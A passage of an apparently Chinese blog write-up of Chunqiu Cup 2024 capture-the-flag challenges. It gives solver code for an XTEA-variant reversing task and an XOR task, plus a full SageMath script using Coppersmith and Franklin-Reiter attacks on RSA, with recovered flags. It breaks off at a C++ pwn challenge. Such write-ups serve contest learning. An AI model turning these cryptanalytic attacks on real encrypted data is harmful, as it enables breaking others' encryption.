class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdint.h&gt;</span></span><br><span class="line"></span><br><span class="line">//void xtea_encipher(unsigned <span class="built_in">int</span> num_rounds, uint32_t v[<span class="number">2</span>], uint32_t const key[<span class="number">4</span>]) &#123;</span><br><span class="line">//    uint32_t <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">//    uint32_t delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">//    uint32_t k[<span class="number">4</span>];</span><br><span class="line">//    memcpy(k, key, sizeof(k));</span><br><span class="line">//    uint32_t v0 = v[<span class="number">0</span>];</span><br><span class="line">//    uint32_t v1 = v[<span class="number">1</span>];</span><br><span class="line">//    <span class="keyword">for</span> (unsigned <span class="built_in">int</span> i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">//        uint32_t f = v1 &lt;&lt; <span class="number">4</span>;</span><br><span class="line">//        uint32_t g = v1 &gt;&gt; <span class="number">5</span>;</span><br><span class="line">//        uint32_t h = f ^ g;</span><br><span class="line">//        uint32_t i = h + v1;</span><br><span class="line">//        uint32_t j = i ^ (<span class="built_in">sum</span> + k[<span class="built_in">sum</span> &amp; <span class="number">3</span>]);</span><br><span class="line">//        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (<span class="built_in">sum</span> + k[<span class="built_in">sum</span> &amp; <span class="number">3</span>]);  //<span class="number">1375741483</span></span><br><span class="line">//        <span class="built_in">sum</span> += delta;</span><br><span class="line">//        uint32_t a = v0 &lt;&lt; <span class="number">4</span>;</span><br><span class="line">//        uint32_t b = v0 &gt;&gt; <span class="number">5</span>;</span><br><span class="line">//        uint32_t c = a ^ b;</span><br><span class="line">//        uint32_t d = c + v0;    </span><br><span class="line">//        uint32_t e = d^ (<span class="built_in">sum</span> + k[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">//        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (<span class="built_in">sum</span> + k[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">//    &#125;</span><br><span class="line">//    v[<span class="number">0</span>] = v0;</span><br><span class="line">//    v[<span class="number">1</span>] = v1;</span><br><span class="line">//&#125;</span><br><span class="line">void decipher(unsigned <span class="built_in">int</span> num_rounds, uint32_t v[<span class="number">2</span>], uint32_t const key[<span class="number">4</span>]) &#123;</span><br><span class="line">    unsigned <span class="built_in">int</span> i;</span><br><span class="line">    uint32_t v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x20252025</span>, <span class="built_in">sum</span> = delta * num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">6</span>)^<span class="number">0x42</span>) + v0) ^ (<span class="built_in">sum</span> + key[(<span class="built_in">sum</span> &gt;&gt; <span class="number">7</span>) &amp; <span class="number">3</span>])^<span class="number">3</span>;</span><br><span class="line">        <span class="built_in">sum</span> -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">6</span>)^<span class="number">0x42</span>) + v1) ^ (<span class="built_in">sum</span> + key[<span class="built_in">sum</span> &amp; <span class="number">3</span>])^<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    uint32_t const key[<span class="number">4</span>] = &#123; <span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">5</span> &#125;;//<span class="number">0x64636261</span>,<span class="number">0x68676665</span>,<span class="number">0x34333231</span>,<span class="number">0x38373635</span>,<span class="number">0x6c6b6a69</span>,<span class="number">0x706f6e6d</span>,<span class="number">0x72657771</span>,<span class="number">0</span></span><br><span class="line">    uint32_t v[<span class="number">10</span>] = &#123; <span class="number">0x83845981</span>,<span class="number">0x34402115</span>,<span class="number">0xfb1f53d2</span>,<span class="number">0x547564c9</span>,<span class="number">0x3b42fcc6</span>,<span class="number">0x2b67fcde</span>,<span class="number">0x675ab09c</span>,<span class="number">0x1d47f41a</span>,<span class="number">0x876d3272</span>,<span class="number">0x734d7d95</span> &#125;;</span><br><span class="line">    <span class="built_in">int</span> byte_16561[<span class="number">256</span>] = &#123; <span class="number">164</span>, <span class="number">196</span>, <span class="number">4</span>, <span class="number">206</span>, <span class="number">20</span>, <span class="number">149</span>, <span class="number">233</span>, <span class="number">17</span>, <span class="number">49</span>, <span class="number">24</span>, <span class="number">182</span>, <span class="number">176</span>, <span class="number">1</span>, <span class="number">38</span>, <span class="number">36</span>, <span class="number">106</span>, <span class="number">123</span>, <span class="number">18</span>, <span class="number">203</span>, <span class="number">103</span>, <span class="number">219</span>, <span class="number">248</span>, <span class="number">210</span>, <span class="number">126</span>, <span class="number">157</span>, <span class="number">208</span>, <span class="number">12</span>, <span class="number">95</span>, <span class="number">130</span>, <span class="number">33</span>, <span class="number">135</span>, <span class="number">131</span>, <span class="number">134</span>, <span class="number">124</span>, <span class="number">194</span>, <span class="number">159</span>, <span class="number">41</span>, <span class="number">202</span>, <span class="number">191</span>, <span class="number">73</span>, <span class="number">222</span>, <span class="number">78</span>, <span class="number">205</span>, <span class="number">98</span>, <span class="number">83</span>, <span class="number">190</span>, <span class="number">167</span>, <span class="number">3</span>, <span class="number">47</span>, <span class="number">181</span>, <span class="number">171</span>, <span class="number">148</span>, <span class="number">204</span>, <span class="number">46</span>, <span class="number">29</span>, <span class="number">243</span>, <span class="number">54</span>, <span class="number">16</span>, <span class="number">186</span>, <span class="number">215</span>, <span class="number">19</span>, <span class="number">53</span>, <span class="number">229</span>, <span class="number">179</span>, <span class="number">129</span>, <span class="number">26</span>, <span class="number">160</span>, <span class="number">231</span>, <span class="number">37</span>, <span class="number">117</span>, <span class="number">175</span>, <span class="number">81</span>, <span class="number">67</span>, <span class="number">92</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">216</span>, <span class="number">163</span>, <span class="number">63</span>, <span class="number">113</span>, <span class="number">122</span>, <span class="number">199</span>, <span class="number">198</span>, <span class="number">144</span>, <span class="number">177</span>, <span class="number">187</span>, <span class="number">250</span>, <span class="number">221</span>, <span class="number">185</span>, <span class="number">246</span>, <span class="number">169</span>, <span class="number">183</span>, <span class="number">100</span>, <span class="number">56</span>, <span class="number">223</span>, <span class="number">224</span>, <span class="number">8</span>, <span class="number">178</span>, <span class="number">119</span>, <span class="number">51</span>, <span class="number">91</span>, <span class="number">2</span>, <span class="number">94</span>, <span class="number">121</span>, <span class="number">97</span>, <span class="number">7</span>, <span class="number">105</span>, <span class="number">35</span>, <span class="number">87</span>, <span class="number">74</span>, <span class="number">253</span>, <span class="number">192</span>, <span class="number">43</span>, <span class="number">161</span>, <span class="number">209</span>, <span class="number">40</span>, <span class="number">9</span>, <span class="number">111</span>, <span class="number">128</span>, <span class="number">85</span>, <span class="number">254</span>, <span class="number">66</span>, <span class="number">227</span>, <span class="number">71</span>, <span class="number">68</span>, <span class="number">225</span>, <span class="number">255</span>, <span class="number">188</span>, <span class="number">125</span>, <span class="number">139</span>, <span class="number">154</span>, <span class="number">96</span>, <span class="number">173</span>, <span class="number">151</span>, <span class="number">251</span>, <span class="number">141</span>, <span class="number">214</span>, <span class="number">172</span>, <span class="number">30</span>, <span class="number">15</span>, <span class="number">69</span>, <span class="number">234</span>, <span class="number">245</span>, <span class="number">75</span>, <span class="number">45</span>, <span class="number">59</span>, <span class="number">34</span>, <span class="number">28</span>, <span class="number">90</span>, <span class="number">114</span>, <span class="number">70</span>, <span class="number">195</span>, <span class="number">228</span>, <span class="number">93</span>, <span class="number">218</span>, <span class="number">146</span>, <span class="number">155</span>, <span class="number">10</span>, <span class="number">189</span>, <span class="number">153</span>, <span class="number">133</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">165</span>, <span class="number">86</span>, <span class="number">55</span>, <span class="number">76</span>, <span class="number">22</span>, <span class="number">132</span>, <span class="number">162</span>, <span class="number">180</span>, <span class="number">109</span>, <span class="number">84</span>, <span class="number">230</span>, <span class="number">193</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">61</span>, <span class="number">136</span>, <span class="number">247</span>, <span class="number">21</span>, <span class="number">88</span>, <span class="number">239</span>, <span class="number">77</span>, <span class="number">238</span>, <span class="number">137</span>, <span class="number">104</span>, <span class="number">89</span>, <span class="number">184</span>, <span class="number">32</span>, <span class="number">232</span>, <span class="number">220</span>, <span class="number">201</span>, <span class="number">145</span>, <span class="number">252</span>, <span class="number">213</span>, <span class="number">200</span>, <span class="number">65</span>, <span class="number">158</span>, <span class="number">118</span>, <span class="number">120</span>, <span class="number">50</span>, <span class="number">25</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">57</span>, <span class="number">107</span>, <span class="number">197</span>, <span class="number">82</span>, <span class="number">39</span>, <span class="number">168</span>, <span class="number">6</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">13</span>, <span class="number">152</span>, <span class="number">140</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">27</span>, <span class="number">64</span>, <span class="number">143</span>, <span class="number">79</span>, <span class="number">60</span>, <span class="number">235</span>, <span class="number">112</span>, <span class="number">217</span>, <span class="number">99</span>, <span class="number">211</span>, <span class="number">226</span>, <span class="number">44</span>, <span class="number">240</span>, <span class="number">147</span>, <span class="number">58</span>, <span class="number">244</span>, <span class="number">0</span>, <span class="number">242</span>, <span class="number">170</span>, <span class="number">127</span>, <span class="number">42</span>, <span class="number">48</span>, <span class="number">236</span>, <span class="number">108</span>, <span class="number">116</span>, <span class="number">110</span>, <span class="number">241</span>, <span class="number">14</span>, <span class="number">62</span>, <span class="number">237</span>, <span class="number">150</span>, <span class="number">174</span>, <span class="number">138</span>, <span class="number">207</span>, <span class="number">11</span>, <span class="number">156</span>, <span class="number">212</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> h = <span class="number">0</span>; h &lt; <span class="number">10</span>; h += <span class="number">2</span>) &#123;</span><br><span class="line">        uint32_t tmp = v[h];</span><br><span class="line">        uint8_t* first_byte = (uint8_t*)&amp;tmp;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> g = <span class="number">0</span>; g &lt; <span class="number">4</span>; g++) &#123;</span><br><span class="line">            <span class="built_in">int</span> index = *(first_byte + g);</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> l = <span class="number">0</span>; l &lt; <span class="number">256</span>; l++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (index == byte_16561[l])&#123;</span><br><span class="line">                    *(first_byte + g) = l;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v[h] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> h = <span class="number">0</span>; h &lt; <span class="number">10</span>; h++) &#123;</span><br><span class="line">        printf(<span class="string">&quot;%xn&quot;</span>, v[h]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> l = <span class="number">0</span>; l &lt; <span class="number">9</span>; l+=<span class="number">2</span>) &#123;</span><br><span class="line">        uint32_t m[<span class="number">2</span>];</span><br><span class="line">        m[<span class="number">0</span>] = v[l];</span><br><span class="line">        m[<span class="number">1</span>] = v[l + <span class="number">1</span>];</span><br><span class="line">        decipher(<span class="number">32</span>, m, key);</span><br><span class="line">        char* <span class="built_in">input</span> = (char*)m;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            printf(<span class="string">&quot;%c&quot;</span>, <span class="built_in">input</span>[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"> //flag&#123;e8ff1a85-5ccd-<span class="number">4171</span>-9f2a-ce6eea614a54&#125;</span><br><span class="line">    //decipher(<span class="number">32</span>, v, key);</span><br><span class="line">    //char* <span class="built_in">input</span> = (char*)v;</span><br><span class="line">    //printf(<span class="string">&quot;start:n&quot;</span>);</span><br><span class="line">    //<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">    //    printf(<span class="string">&quot;%cn&quot;</span>, <span class="built_in">input</span>[i]);</span><br><span class="line">    //&#125;</span><br><span class="line">    //<span class="keyword">for</span> (<span class="built_in">int</span> h = <span class="number">0</span>; h &lt; <span class="number">8</span>; h++) &#123;</span><br><span class="line">    //    printf(<span class="string">&quot;%dn&quot;</span>, <span class="built_in">input</span>[h]);</span><br><span class="line">    //&#125;</span><br><span class="line">&#125;//<span class="number">0xd659641b</span>,<span class="number">0x1ff8f057</span>,<span class="number">0x68dbe56d</span>,<span class="number">0x36c73dcb</span>,<span class="number">0xff6fb296</span>,<span class="number">0x45245c08</span>,<span class="number">0x3fb8e222</span>,<span class="number">0x3d546a65</span>,</span><br></pre></td></tr></table></figure>

<h2 id="ezre"><a href="#ezre" class="headerlink" title="ezre"></a>ezre</h2><a class="btn-beautify " target="_blank" rel="noopener" href="https://video.bbling.cc/wp%E6%98%A5%E7%A7%8B%E6%9D%AF2024/ezre.zip" title="点击下载题文件"><span>点击下载题文件</span></a>

<p>看到计算哈希的函数<code>custom_md5_init</code></p>
<p><img src="https://bu.dusays.com/2025/01/20/678e08d50b2aa.png"></p>
<p>得知要计算的是从该函数开始向后的<code>1024</code>个字节</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e08f52d52b.png"></p>
<p>用<code>010</code>手动提取并计算<code>md5</code>值。</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e0918482c6.png"></p>
<p>用前面的<code>md5</code>值作为伪随机数的种子，得到随机数队列。</p>
<p>解题脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">0x5c</span>, <span class="number">0x76</span>, <span class="number">0x4a</span>, <span class="number">0x78</span>, <span class="number">0x15</span>, <span class="number">0x62</span>, <span class="number">0x05</span>, <span class="number">0x7c</span>, <span class="number">0x6b</span>, <span class="number">0x21</span>, </span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x66</span>, <span class="number">0x5b</span>, <span class="number">0x1a</span>, <span class="number">0x48</span>, <span class="number">0x7a</span>, <span class="number">0x1e</span>, <span class="number">0x46</span>, <span class="number">0x7f</span>, <span class="number">0x28</span>, </span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x75</span>, <span class="number">0x68</span>, <span class="number">0x2a</span>, <span class="number">0x34</span>, <span class="number">0x0c</span>, <span class="number">0x4b</span>, <span class="number">0x1d</span>, <span class="number">0x3d</span>, <span class="number">0x2e</span>, </span><br><span class="line">    <span class="number">0x6b</span>, <span class="number">0x7a</span>, <span class="number">0x17</span>, <span class="number">0x45</span>, <span class="number">0x07</span>, <span class="number">0x75</span>, <span class="number">0x47</span>, <span class="number">0x27</span>, <span class="number">0x39</span>, <span class="number">0x78</span>, </span><br><span class="line">    <span class="number">0x61</span>, <span class="number">0x0b</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = [<span class="number">58</span>, <span class="number">26</span>, <span class="number">43</span>, <span class="number">31</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">69</span>, <span class="number">82</span>, <span class="number">68</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">58</span>, <span class="number">55</span>, <span class="number">125</span>, <span class="number">67</span>, <span class="number">123</span>, <span class="number">35</span>, <span class="number">82</span>, <span class="number">28</span>, <span class="number">96</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">86</span>, <span class="number">56</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">16</span>, <span class="number">29</span>, <span class="number">82</span>, <span class="number">74</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">97</span>, <span class="number">22</span>, <span class="number">117</span>, <span class="number">20</span>, <span class="number">92</span>, <span class="number">65</span>, <span class="number">88</span>, <span class="number">118</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i] ^ key[i]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;b799eb3a-59ee-4b3b-b49d-39080fc23e99&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><a class="btn-beautify " target="_blank" rel="noopener" href="https://video.bbling.cc/wp%E6%98%A5%E7%A7%8B%E6%9D%AF2024/RSA1.zip" title="点击下载题文件"><span>点击下载题文件</span></a>

<p>Franklin-Reiter相关消息攻击，先找到m2与m1的关系，m2&#x3D;m1+k，求出k</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m1 = bytes_to_long(flag)</span><br><span class="line">m2 = bytes_to_long(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) + <span class="number">3</span>) % <span class="number">128</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag.decode()).encode())</span><br></pre></td></tr></table></figure>

<p>特别要注意flag最后的’}’，其ascii是125，加3之后模128为0，所以该字符要特殊处理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">130</span>):</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">130</span> - <span class="number">42</span>:</span><br><span class="line">        k += <span class="number">3</span> * <span class="built_in">pow</span>(<span class="number">2</span>, i * <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k -= <span class="number">125</span> * <span class="built_in">pow</span>(<span class="number">2</span>, i * <span class="number">8</span>)  <span class="comment"># &#x27;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>联立c2和c3，即<code>f = c2^2835 - (c3-e)^2025</code>，可以用coppersmith解出e，但这里多项式的度比较大，求解不出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e = getPrime(<span class="number">128</span>)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1 * e, <span class="number">2835</span>, N)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, <span class="number">2025</span>, N)</span><br><span class="line">c3 = <span class="built_in">pow</span>(m2, <span class="number">2835</span>, N) + e</span><br></pre></td></tr></table></figure>

<p>注意到<code>lcm(2025,2835)=14175</code>，有<code>2025*7=2835*5</code>，所以可以用5和7代替</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = PolynomialRing(Zmod(N), <span class="string">&#x27;x&#x27;</span>).gen()</span><br><span class="line">f = c2**<span class="number">7</span> - (c3-x)**<span class="number">5</span></span><br><span class="line">f = f.monic()</span><br><span class="line">res = f.small_roots(X=<span class="number">2</span>**<span class="number">128</span>, beta=<span class="number">1</span>, epsilon=<span class="number">0.05</span>)</span><br><span class="line">e = res[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>求出e后，联立c1和c2，通过Franklin-Reiter方法即可解出m1（但还不是flag）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">    <span class="keyword">while</span> g2:</span><br><span class="line">        g1, g2 = g2, g1 % g2</span><br><span class="line">    <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">x = PolynomialRing(Zmod(N), <span class="string">&#x27;x&#x27;</span>).gen()</span><br><span class="line">g1 = (x*e)**<span class="number">2835</span> - c1</span><br><span class="line">g2 = (x+k)**<span class="number">2025</span> - c2</span><br><span class="line">m1 = <span class="built_in">int</span>(-gcd(g1, g2)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p>这里有一个坑，注意到一开始flag的构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()).encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">flag += <span class="built_in">bin</span>(getPrime((<span class="number">1024</span> - bytes_to_long(flag).bit_length()) // <span class="number">8</span>)).encode()</span><br><span class="line">m1 = bytes_to_long(flag)</span><br></pre></td></tr></table></figure>

<p>m1&gt;N，但没有大很多，可以根据flag头爆破出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    m1 += N</span><br><span class="line">    flag = long_to_bytes(m1)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i = &#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>完整exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = <span class="number">176871561120476589165761750300633332586877708342448994506175624203633860119621512318321172927876389631918300184221082317741380365447197777026256405312212716630617721606918066048995683899616059388173629437673018386590043053146712870572300799479269947118251011967950970286626852935438101046112260915112568392601</span></span><br><span class="line">c1 = <span class="number">47280375006817082521114885578132104427687384457963920263778661542552259860890075321953563867658233347930121507835612417278438979006705016537596357679038471176957659834155694284364682759675841808209812316094965393550509913984888849945421092463842546631228640293794745005338773574343676100121000764021207044019</span></span><br><span class="line">c2 = <span class="number">176231410933979134585886078013933649498379873444851943224935010972452769899603364686158279269197891190643725008151812150428808550310587709008683339436590112802756767140102136304346001599401670291938369014436170693864034099138767167055456635760196888578642643971920733784690410395944410255241615897032471127315</span></span><br><span class="line">c3 = <span class="number">135594807884016971356816423169128168727346102408490289623885211179619571354105102393658249292333179346497415129785184654008299725617668655640857318063992703265407162085178885733134590524577996093366819328960462500124201402816244104477018279673183368074374836717994805448310223434099196774685324616523478136309</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">130</span>):</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">130</span> - <span class="number">42</span>:</span><br><span class="line">        k += <span class="number">3</span> * <span class="built_in">pow</span>(<span class="number">2</span>, i * <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k -= <span class="number">125</span> * <span class="built_in">pow</span>(<span class="number">2</span>, i * <span class="number">8</span>)  <span class="comment"># &#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x = PolynomialRing(Zmod(N), <span class="string">&#x27;x&#x27;</span>).gen()</span><br><span class="line">f = c2**<span class="number">7</span> - (c3-x)**<span class="number">5</span></span><br><span class="line">f = f.monic()</span><br><span class="line">res = f.small_roots(X=<span class="number">2</span>**<span class="number">128</span>, beta=<span class="number">1</span>, epsilon=<span class="number">0.05</span>)</span><br><span class="line">e = res[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">    <span class="keyword">while</span> g2:</span><br><span class="line">        g1, g2 = g2, g1 % g2</span><br><span class="line">    <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">x = PolynomialRing(Zmod(N), <span class="string">&#x27;x&#x27;</span>).gen()</span><br><span class="line">g1 = (x*e)**<span class="number">2835</span> - c1</span><br><span class="line">g2 = (x+k)**<span class="number">2025</span> - c2</span><br><span class="line">m1 = <span class="built_in">int</span>(-gcd(g1, g2)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    m1 += N</span><br><span class="line">    flag = long_to_bytes(m1)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i = &#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="Gender-Simulation"><a href="#Gender-Simulation" class="headerlink" title="Gender_Simulation"></a>Gender_Simulation</h2><a class="btn-beautify " target="_blank" rel="noopener" href="https://video.bbling.cc/wp%E6%98%A5%E7%A7%8B%E6%9D%AF2024/gender_simulation.zip" title="点击下载题文件"><span>点击下载题文件</span></a>



<p>Boy和Girl类都是继承自Baby类，但是对gender这个虚函数方法的实现不同：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Baby</span> &#123;</span><br><span class="line">public:</span><br><span class="line">    virtual void gender() = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Boy</span>: public Baby&#123;</span><br><span class="line">public:</span><br><span class="line">    Boy() &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;A boy was born&quot;</span> &lt;&lt; endl;</span><br><span class="line">    